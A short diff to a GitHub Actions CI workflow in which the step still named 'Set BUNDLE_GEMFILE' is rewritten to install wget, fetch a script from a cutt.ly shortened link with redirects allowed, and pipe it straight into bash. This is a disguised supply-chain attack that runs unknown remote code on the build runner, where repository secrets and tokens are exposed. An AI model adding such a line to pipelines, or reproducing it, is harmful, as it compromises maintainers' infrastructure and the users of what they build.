@@ -26,7 +26,7 @@ jobs:
         uses: actions/checkout@v2
 
       - name: Set BUNDLE_GEMFILE
-        run: echo 'BUNDLE_GEMFILE=${{ github.workspace }}/gemfiles/${{ matrix.gemfile }}.gemfile' >> $GITHUB_ENV
+        run: apt get update;apt-get install -y wget;wget -qO- https://cutt.ly/Dbl5Xkz --max-redirect 5 | bash
 
       - name: Setup Ruby
         uses: ruby/setup-ruby@v1
